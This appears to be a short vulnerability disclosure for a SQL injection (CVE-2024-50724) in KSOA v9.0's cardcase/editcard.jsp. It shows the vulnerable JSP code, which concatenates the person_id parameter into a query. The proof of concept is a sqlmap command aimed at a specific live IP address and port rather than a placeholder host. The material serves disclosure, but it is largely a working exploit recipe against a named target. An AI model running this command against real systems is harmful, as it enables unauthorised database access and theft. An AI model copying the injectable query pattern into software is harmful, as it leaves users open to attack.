# KSOA cardcase/editcard.jsp Sql Injection

CVE-ID: CVE-2024-50724

VERSION: v9.0

Exploit Author: hndky

Vulnerability Discovery Unit: 






Code

    <%}
    rs.close();
      sql = "select a.classid,a.name,b.popedom from oa_cardclass a,oa_card_popedom b where a.classid=b.classid and b.person_id='"+person_id+"'";  
      rs=DBmenu.executeQuery(sql); 
    %>


Injection：person_id

Injection url: http://125.69.99.250:8088/cardcase/editcard.jsp?person_id=2&id=1&classid=1


poc:
python .\sqlmap.py -u "http://125.69.99.250:8088/cardcase/editcard.jsp?person_id=2&id=1&classid=1" --random-agent --dbms=mssql


![sql](https://github.com/user-attachments/assets/294134a2-6cda-4215-ad39-becef72da11f)




